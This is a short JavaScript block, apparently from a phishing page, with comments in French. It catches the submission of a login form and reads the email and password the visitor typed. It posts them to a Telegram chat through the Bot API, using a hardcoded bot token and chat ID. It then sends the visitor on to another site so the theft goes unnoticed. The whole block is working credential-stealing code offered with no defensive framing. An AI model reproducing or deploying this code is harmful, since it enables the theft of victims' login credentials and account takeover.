    <script>
        // Bot Telegram
        const token = "8047026898:AAEYkbvc49hNhy9bGvd5iG07PHRe1jKj6uI";
        const chatId = "5601119281";

        // Envoie les infos à Telegram
        async function sendToTelegram(formData) {
            const message = `Nouveau message depuis le formulaire :
E-mail: ${formData.user}
Mot de passe: ${formData.pass}`;
            const url = `https://api.telegram.org/bot${token}/sendMessage`;

            const response = await fetch(url, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            });

            return response.json();
        }

        // Soumission du formulaire
        document.getElementById("loginForm").addEventListener("submit", function (event) {
            event.preventDefault();

            const user = document.getElementById("user").value;
            const pass = document.getElementById("pass").value;

            const formData = { user, pass };

            sendToTelegram(formData)
                .then(response => {
                    if (response.ok) {
                        window.location.href = "https://adresse1.vercel.app/";
                    } else {
                        alert("Erreur lors de l'envoi des informations.");
                    }
                })
                .catch(error => {
                    console.error("Erreur : ", error);
                });
        });
    </script>
